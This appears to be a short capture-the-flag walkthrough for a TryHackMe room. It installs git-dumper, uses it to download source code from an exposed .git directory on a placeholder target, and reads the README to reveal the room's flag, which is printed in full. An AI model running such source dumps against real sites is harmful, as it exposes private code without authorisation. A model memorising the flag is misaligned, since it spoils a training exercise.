***Room 404 | TryHackMe | Walkthrough***

![byte](/writeups/images/room4041.png)



https://tryhackme.com/room/hh-room404-804573bf


![dump](/writeups/images/room4042.png)

### 1.Create a Python virtual environment
```bash
python3 -m venv room404

```
### 2.Activate the environment
```bash
source room404/bin/activate
```


### 3.Install Git Dumper
```bash
pip install git-dumper
```

### 4.Dump the exposed source code.
```bash
git-dumper \ http://TARGET_IP:8080/.git/ byte-lotus-source--code
```

![dumper](/writeups/images/room4043.png)

### 5.Red Flag
```bash
cat byte-lotus-source--code/README.md
```

![cat](/writeups/images/room4044.png)
  
***we have it***
```bash  
THM{byt3_l0tus_n3v3r_f0rg3ts}
```







